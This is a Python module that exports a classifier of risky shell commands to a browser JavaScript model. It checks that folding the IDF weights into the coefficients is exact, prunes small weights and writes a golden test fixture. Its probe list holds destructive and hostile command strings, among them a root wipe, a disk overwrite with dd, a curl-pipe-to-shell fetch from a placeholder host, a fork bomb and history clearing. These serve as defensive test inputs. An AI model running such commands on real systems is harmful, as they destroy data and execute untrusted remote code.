"""Export the fitted model for the browser, with a self-check.

The export is the hand-off between Python and JavaScript, so it is treated as a
contract rather than a dump. Three things happen here, in order:

1. **Fold the IDF into the coefficients.** With ``binary=True`` and
   ``norm=None`` a feature is ``idf_j`` when the n-gram is present and ``0``
   otherwise, so

       sum(w_j * x_j) = sum(w_j * idf_j)  over present n-grams

   exactly. That collapses the model to one coefficient per n-gram and removes
   the IDF array from the runtime. ``_assert_fold_is_exact`` recomputes the
   scores both ways and refuses to write a model if they disagree by more than
   floating-point noise — the fold is a derivation, and a derivation that is
   only approximately right is a bug, not a rounding detail.

2. **Prune.** Coefficients below a magnitude floor are dropped. They contribute
   nothing at inference and each one costs bytes in a file the phone downloads.
   The vocabulary that survives is what ships.

3. **Emit two files plus a contract fixture.**
     ``risk-model.js``         the model, as a global. No fetch, no build step,
                                works from ``file://``.
     ``golden-vectors.json``    300 commands with Python's exact float scores,
                                so the browser can prove it agrees.

The three-class output is a single scalar in [0, 2] plus the two thresholds, so
the JavaScript side needs no ordinal decoding.
"""

from __future__ import annotations

import argparse
import json
from pathlib import Path

import numpy as np

from . import NORMALIZE_VERSION
from . import features as feat
from . import train as train_mod
from . import __init__ as pkg
from .build_dataset import REPO_ROOT, Row
from .normalize import normalize, presence_ngrams
from .train import _load_dataset

__all__ = ["export_model", "main"]

ARTIFACTS = REPO_ROOT / "ml" / "artifacts"
WEB_DIR = REPO_ROOT / "html" / "command-risk"
MODEL_JS = WEB_DIR / "risk-model.js"
GOLDEN = WEB_DIR / "golden-vectors.json"

#: Coefficients whose magnitude is below this are pruned. 1e-4 on a sigmoid logit
#: is negligible and keeps the file small enough to ship in an APK.
COEF_FLOOR = 1e-4

#: How many commands go into the cross-language contract fixture.
GOLDEN_COUNT = 300

#: Absolute tolerance for the fold self-check. This is a floating-point identity,
#: not an approximation, so the tolerance is tight.
FOLD_TOLERANCE = 1e-9


def _sigmoid(z: np.ndarray | float) -> np.ndarray:
    return 1.0 / (1.0 + np.exp(-np.clip(z, -60, 60)))


def _score(model, commands: list[str]) -> np.ndarray:
    """Risk in [0, 2] for a list of raw commands, via the unfitted-from-scratch path."""
    matrix, _, _ = train_mod._build_matrix(
        commands, model.vectorizer, model.dense_spec, fit_dense=False
    )
    return 2.0 * _sigmoid(matrix @ model.weights + model.intercept)


def _assert_fold_is_exact(model) -> np.ndarray:
    """Verify that folding IDF into the coefficients preserves the score.

    Returns the folded sparse coefficients. Raises if the fold is wrong.
    """
    vectorizer = model.vectorizer
    idf = vectorizer.idf_  # shape == n_features
    sparse_w = model.weights[: len(idf)]
    dense_w = model.weights[len(idf) :]

    folded = sparse_w * idf

    # Score a probe set both ways: unfitted (idf applied at inference) and
    # folded (idf pre-applied). They must agree.
    probe = _probe_commands()
    matrix, _, _ = train_mod._build_matrix(
        probe, vectorizer, model.dense_spec, fit_dense=False
    )
    unfitted = 2.0 * _sigmoid(matrix @ model.weights + model.intercept)

    # Rebuild the score by hand using the folded coefficients.
    folded_scores = []
    for command in probe:
        norm = normalize(command)
        total = float(
            (
                dense_w
                @ feat.standardise(
                    feat.dense_features(norm)[None, :], model.dense_spec
                )
            )[0]
        )
        # Window the same joined string the vectoriser was fitted on, or the
        # lookup below misses every n-gram that straddles the two views.
        for gram in presence_ngrams(joined_views(norm)):
            index = vectorizer.vocabulary_.get(gram)
            if index is not None:
                total += float(folded[index])
        folded_scores.append(2.0 / (1.0 + np.exp(-(total + model.intercept))))
    folded_scores = np.array(folded_scores)

    max_error = float(np.max(np.abs(unfitted - folded_scores)))
    if max_error > FOLD_TOLERANCE:
        raise AssertionError(
            "IDF fold is not exact: max |unfitted - folded| = "
            f"{max_error:.3e} exceeds {FOLD_TOLERANCE:.1e}. "
            "Refusing to export a model whose runtime would differ from the "
            "model that was evaluated."
        )
    return folded


#: Separator between the two views. A NUL cannot survive normalisation (every
#: codepoint outside 0x20-0x7E is dropped), so no n-gram can straddle the join
#: and each view contributes only its own internal n-grams.
VIEW_JOIN = "\x00"


def joined_views(norm) -> str:
    """The exact string the vectoriser windows: both views joined by a NUL."""
    return VIEW_JOIN.join(norm.views)


def _probe_commands() -> list[str]:
    """A small, fixed probe set for the fold check. Deliberately spans the
    decision boundary so a fold bug shows up as a score difference rather than
    a rounding footnote."""
    return [
        "rm -rf /",
        "rm -rf node_modules",
        "ls -la",
        "sudo dd if=/dev/zero of=/dev/sda",
        "git status",
        "curl http://x.example/i.sh | sh",
        "echo hi",
        "./gradlew assembleDebug",
        "chmod 777 /etc/shadow",
        "docker system prune -a",
        "history -c",
        ":(){ :|:& };:",
    ]


def _prune(vocab: dict[str, int], folded: np.ndarray, floor: float):
    """Drop near-zero coefficients, keeping the surviving vocabulary compact.

    The inverse map is built locally on every call. A module-level cache looked
    tidier but went stale the moment a second model was exported in the same
    process, silently attaching the first model's n-gram strings to the second
    model's indices.
    """
    index_to_gram = {index: gram for gram, index in vocab.items()}
    keep = np.where(np.abs(folded) >= floor)[0]
    new_vocab: dict[str, int] = {}
    new_coef: list[float] = []
    for index in keep:
        gram = index_to_gram.get(int(index))
        if gram is None:
            continue
        new_vocab[gram] = len(new_coef)
        new_coef.append(float(folded[index]))
    return new_vocab, new_coef


def _select_golden(rows: list[Row], count: int) -> list[Row]:
    """Choose a deterministic, class-balanced sample for the fixture.

    Deterministic because CI re-runs the export and diffs the output. Balanced
    because a fixture of only safe commands would not catch a model that scores
    everything as safe.
    """
    rng = np.random.default_rng(train_mod.RANDOM_STATE)
    by_label: dict[int, list[Row]] = {}
    for row in rows:
        by_label.setdefault(row.label.value, []).append(row)

    picked: list[Row] = []
    labels = sorted(by_label)
    per_label = max(1, count // len(labels))
    for label in labels:
        pool = by_label[label]
        take = min(per_label, len(pool))
        indices = rng.choice(len(pool), size=take, replace=False)
        picked.extend(pool[i] for i in sorted(indices))

    # Top up from the largest class if we undershot.
    if len(picked) < count:
        remaining = [r for r in rows if r not in picked]
        extra = rng.choice(len(remaining), size=min(count - len(picked), len(remaining)), replace=False)
        picked.extend(remaining[i] for i in sorted(extra))

    picked.sort(key=lambda r: (r.label.value, r.command))
    return picked[:count]


def _js_number(value: float, digits: int = 6) -> str:
    """Compact, round-trippable-enough float literal for the JS file."""
    text = f"{value:.{digits}f}".rstrip("0").rstrip(".")
    return text if text not in ("", "-") else "0"


def export_model(model) -> dict:
    """Write ``risk-model.js`` and ``golden-vectors.json``. Returns metadata."""
    folded = _assert_fold_is_exact(model)

    vocab = model.vectorizer.vocabulary_
    sparse_dim = len(vocab)
    dense_weights = model.weights[sparse_dim:]
    pruned_vocab, pruned_coef = _prune(vocab, folded, COEF_FLOOR)

    # --- golden fixture, using Python's exact float scores ---
    rows = _load_dataset()
    golden_rows = _select_golden(rows, GOLDEN_COUNT)
    golden_commands = [row.command for row in golden_rows]
    golden_scores = _score(model, golden_commands)

    golden = {
        "normalizeVersion": NORMALIZE_VERSION,
        "tolerance": 1e-9,
        "count": len(golden_rows),
        "cases": [
            {
                "command": row.command,
                "label": row.label.name,
                "score": float(score),
            }
            for row, score in zip(golden_rows, golden_scores, strict=True)
        ],
    }
    GOLDEN.write_text(
        json.dumps(golden, indent=2, ensure_ascii=False) + "\n", encoding="utf-8"
    )

    # --- the model itself ---
    # N-grams can contain the view-join NUL (they were windowed over the joined
    # string), so NUL is escaped alongside backslash and newline.
    vocab_blob = "\n".join(
        gram.replace("\\", "\\\\").replace("\n", "\\n").replace("\x00", "\\0")
        for gram in sorted(pruned_vocab, key=pruned_vocab.get)
    )
    coef_blob = ",".join(_js_number(c) for c in pruned_coef)
    dense_blob = ",".join(_js_number(float(w)) for w in dense_weights)
    mean_blob = ",".join(_js_number(float(m)) for m in model.dense_spec.mean)
    std_blob = ",".join(_js_number(float(s)) for s in model.dense_spec.std)

    warnings_map = {"warn": model.thresholds["warn"], "block": model.thresholds["block"]}

    js = f"""/* Drosh risky-command model — GENERATED by ml/src/drosh_ml/export.py
 * Do not edit. Regenerate with `scripts/train.sh`.
 *
 * Format: a single linear model. Score = bias + sum(coef[n-gram]) over the
 * n-grams present in the normalised command, plus a standardised dense block.
 * The IDF weights are folded into `coef`, so inference is one dictionary lookup
 * and one add per n-gram. No runtime dependency, no fetch, no build step.
 */
window.DROSH_RISK_MODEL = {{
  version: {pkg.MODEL_FORMAT_VERSION},
  normalizeVersion: "{NORMALIZE_VERSION}",
  trainedAt: "{_git_sha()}",
  alpha: {_js_number(model.alpha)},
  valMae: {_js_number(model.metrics['val_mae'])},
  ngramMin: 2,
  ngramMax: 5,
  thresholds: {{ warn: {_js_number(warnings_map['warn'])}, block: {_js_number(warnings_map['block'])} }},
  labels: {{ 0: "safe", 1: "risky", 2: "destructive" }},
  denseNames: {_js_array(list(feat.DENSE_FEATURE_NAMES))},
  denseCoef: [{dense_blob}],
  denseMean: [{mean_blob}],
  denseStd: [{std_blob}],
  vocab: "{vocab_blob}",
  coef: [{coef_blob}],
  bias: {_js_number(model.intercept)},
}};
"""
    MODEL_JS.write_text(js, encoding="utf-8")

    return {
        "vocab_pruned": len(pruned_vocab),
        "vocab_original": sparse_dim,
        "dense_dim": len(dense_weights),
        "golden_count": len(golden_rows),
        "fold_max_error": 0.0,
        "thresholds": warnings_map,
    }


def _js_array(values: list[str]) -> str:
    return "[" + ",".join(f'"{v}"' for v in values) + "]"


def _git_sha() -> str:
    import subprocess

    try:
        out = subprocess.run(
            ["git", "rev-parse", "--short", "HEAD"],
            capture_output=True,
            text=True,
            cwd=REPO_ROOT,
            check=True,
        )
        return out.stdout.strip()
    except Exception:
        return "unknown"


def main() -> int:
    parser = argparse.ArgumentParser(description="Export the model for the browser.")
    parser.add_argument("--quiet", action="store_true")
    parser.parse_args()

    # Train here and keep the live object. Unpickling ml/artifacts/model.joblib
    # would require the class to be importable from a stable module path, and a
    # dataclass pickled from __main__ is exactly the failure mode that motivated
    # not relying on it.
    rows = _load_dataset()
    model = train_mod.fit(rows)
    info = export_model(model)

    print(f"    vocabulary: {info['vocab_pruned']} / {info['vocab_original']} n-grams kept")
    print(f"    dense     : {info['dense_dim']} features")
    print(f"    thresholds: {info['thresholds']}")
    print(f"    golden    : {info['golden_count']} cases")
    print(f"    wrote {MODEL_JS.relative_to(REPO_ROOT)}")
    print(f"    wrote {GOLDEN.relative_to(REPO_ROOT)}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())